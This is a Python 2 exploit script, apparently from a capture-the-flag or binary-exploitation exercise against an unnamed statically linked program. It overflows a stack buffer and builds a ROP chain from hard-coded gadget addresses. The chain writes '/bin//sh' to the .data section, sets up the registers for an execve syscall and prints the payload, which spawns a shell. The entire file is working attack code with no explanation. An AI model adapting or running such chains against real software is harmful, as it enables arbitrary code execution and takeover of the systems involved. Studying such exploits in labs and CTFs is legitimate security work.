#!/usr/bin/env python2
from struct import pack

# Padding goes here
p = 'A' * 0x20 + 'B' * 8
p += pack('<Q', 0x0000000000406f80)  # pop rsi ; ret
p += pack('<Q', 0x00000000004b80e0)  # @ .data
p += pack('<Q', 0x00000000004489ec)  # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x0000000000477f51)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000406f80)  # pop rsi ; ret
p += pack('<Q', 0x00000000004b80e8)  # @ .data + 8
p += pack('<Q', 0x0000000000443260)  # xor rax, rax ; ret
p += pack('<Q', 0x0000000000477f51)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401796)  # pop rdi ; ret
p += pack('<Q', 0x00000000004b80e0)  # @ .data
p += pack('<Q', 0x0000000000406f80)  # pop rsi ; ret
p += pack('<Q', 0x00000000004b80e8)  # @ .data + 8
p += pack('<Q', 0x0000000000447fb5)  # pop rdx ; ret
p += pack('<Q', 0x00000000004b80e8)  # @ .data + 8
p += pack('<Q', 0x0000000000443260)  # xor rax, rax ; ret
p += pack('<Q', 0x000000000041813f)  # add al, 0x3a ; ret
p += pack('<Q', 0x000000000046d520)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000481605)  # syscall ; ret
print(p)
